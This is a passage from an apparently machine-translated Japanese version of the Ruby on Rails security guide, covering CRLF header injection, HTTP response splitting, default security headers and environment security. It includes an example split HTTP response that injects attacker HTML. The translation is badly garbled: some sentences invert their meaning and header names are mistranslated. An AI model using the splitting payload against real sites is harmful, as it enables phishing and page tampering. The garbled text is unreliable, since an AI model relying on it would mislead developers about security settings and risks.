だからヘッダー注入攻撃ベクトルのヘッダー フィールド CRLF 文字の挿入に基づきます。そして、攻撃者 false リダイレクトで何ができるか？彼は、同じあなたのように見えますが、再度ログインを要求する （ログイン資格情報を攻撃者に送信） フィッシング サイトにリダイレクトできます。または彼はそのサイトでブラウザーのセキュリティ ホールを介して悪意のあるソフトウェアをインストールできませんでした。レール 2.1.2 場所」フィールドredirect_toメソッドでこれらの文字をエスケープします。、自分でそれは他のヘッダー フィールドにユーザー入力をビルドするときに確認してください。

!!!7.8.1 分割応答

ヘッダー注入が可能であった場合は、応答の分割も可能性があります。HTTP では、ヘッダー ブロックは 2 つの Crlf と実際のデータ (通常は HTML) が続きます。応答の分割の 2 つの Crlf はヘッダー フィールド、別のレスポンスを悪意のある HTML に挿入する勧めします。応答になるでしょう。
<<<
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:&#8232;Content-Type: text/html
 
 
HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html
 
 
&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
>>>
特定の状況でこの悪意のある HTML が犠牲者に提示します。ただし、これのみキープア ライブ接続で動作するようです （そして多くのブラウザーは、1 回限りの接続を使用している）。これに依存することはできません。、いずれにしてもこれは重大なバグありバージョン 2.0.5 またはヘッダー インジェクション (および分割応答) を排除する 2.1.2 リスクをあなたのレールを更新する必要があります。

!8 の既定のヘッダー
自分の Rails アプリケーションからのすべての HTTP 応答、次の既定セキュリティ ヘッダーを受信します。
<<<
config.action_dispatch.default_headers = {
  'X-Frame-Options'=> 'SAMEORIGIN',
  'X-XSS-Protection'=> '1; mode=block',
  'X-Content-Type-Options'=> 'nosniff'
}
>>>
config/application.rbの既定のヘッダーを構成することができます。.
<<<
config.action_dispatch.default_headers = {
  'Header-Name'=> 'Header-Value',
  'X-Frame-Options'=> 'DENY'
}
>>>
またはそれらを削除することができます。
<<<
config.action_dispatch.default_headers.clear
>>>
共通ヘッダーの一覧。

*X フレームのオプション'SAMEORIGIN' 既定のレール- フレーミングと同じドメインを許可します。すべてのウェブサイトのためのフレーミングを許可する場合は 'ですべてのフレームを拒否する拒否' または 'が' に設定します。
*X XSS の保護1; モード = ブロック ' 既定のレール- XSS Auditor して XSS 攻撃が検出された場合は、ページをブロックします。XSS Auditor スイッチをオフにする場合は '0' に （スクリプト要求パラメーターからの応答の内容する場合に便利) 設定します。
*X のコンテンツの種類'nosniff' 既定のレール- ファイルの MIME タイプを推測してからブラウザーを停止します。
*X コンテンツ セキュリティ ポリシーがどのサイトを制御するための強力なメカニズム特定コンテンツの種類から読み込むことができます。
*アクセス コントロール許可原点は、サイトを管理するために使用を許可されている同じ元ポリシーのバイパスし、オリジンの要求を送信します。
*厳密なトランスポート セキュリティ、ブラウザーだけセキュリティで保護された接続を介してサイトにアクセスする許可されている場合を制御するために使用

!9 環境セキュリティ
それはあなたのアプリケーション コードと環境をセキュリティで保護する方法を通知するためには、このガイドの範囲外です。ただし、データベース構成は、config/database.ymlと例えばconfig/initializers/secret_token.rbに格納されている、サーバー側の秘密などセキュリティで保護されました。さらにアクセスを制限するこれらのファイルとは、機密情報が含まれている可能性があります他の人の環境固有バージョンを使用することがあります。

!10 その他のリソース
セキュリティ環境をシフトし、新たな脆弱性が不足して壊滅的なことを保つことが重要です。(レール) セキュリティここについての追加リソースを見つけることができます。

Ruby on Rails セキュリティ プロジェクト セキュリティ ニュースを定期的に投稿： http://www.rorsecurity.info
レール セキュリティのメーリング リストを購読します。
他のアプリケーション層に保つ（彼らは週刊ニュースレター、あまりにも） があります。
クロス サイト スクリプティングのカンニングを含む優れたセキュリティ ブログ
